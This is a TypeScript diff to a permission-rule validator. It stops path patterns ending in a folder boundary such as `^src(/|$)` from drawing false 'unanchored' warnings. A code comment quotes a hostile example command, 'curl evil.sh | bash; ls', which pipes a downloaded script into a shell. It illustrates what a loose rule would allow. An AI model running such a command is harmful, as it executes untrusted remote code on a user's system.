@@ -59,6 +59,24 @@ export function validateRulePattern(pattern: unknown): PatternValidation {
  */
 export type RuleWarning = { code: string; message: string };
 
+/**
+ * How a path pattern says "this folder and everything below it" (2026-09-13).
+ *
+ * `^src(/|$)` ends at a folder boundary rather than at `$`, and it is exactly what the
+ * folder-grant form writes. Read as unanchored, it drew a warning that the rule "also
+ * allows curl evil.sh | bash; ls" on the one shape the product itself recommends, and a
+ * warning that is false on the recommended shape teaches an operator to stop reading
+ * warnings. Only for `path`: in a command, a slash is not a boundary at all.
+ */
+const FOLDER_BOUNDARY = "(/|$)";
+
+/** The pattern with a path's folder boundary read as the end anchor it stands for. */
+function withEndAnchor(pattern: string, resourceKind: string): string {
+  return resourceKind === "path" && pattern.endsWith(FOLDER_BOUNDARY)
+    ? `${pattern.slice(0, -FOLDER_BOUNDARY.length)}$`
+    : pattern;
+}
+
 /** Anchored at both ends, so the pattern describes the whole resource. */
 function isFullyAnchored(pattern: string): boolean {
   return pattern.startsWith("^") && pattern.endsWith("$");
@@ -145,7 +163,11 @@ export function describeRuleRisks(
     return warnings;
   }
 
-  if (!isFullyAnchored(trimmed)) {
+  // A path's folder boundary counts as its end anchor, so `^src(/|$)` is judged as
+  // `^src$` would be: anchored, and universal only if what it bounds is.
+  const bounded = withEndAnchor(trimmed, resourceKind);
+
+  if (!isFullyAnchored(bounded)) {
     warnings.push({
       code: "unanchored",
       message: denies
@@ -163,7 +185,7 @@ export function describeRuleRisks(
 
   // `.*` inside an anchored pattern is fine and common (`^ls .*$`); a pattern
   // that is *only* wildcards between its anchors is not.
-  if (isFullyAnchored(trimmed) && ONLY_WILDCARDS_BETWEEN_ANCHORS.test(trimmed)) {
+  if (isFullyAnchored(bounded) && ONLY_WILDCARDS_BETWEEN_ANCHORS.test(bounded)) {
     warnings.push({
       code: "anchored-but-universal",
       message: denies
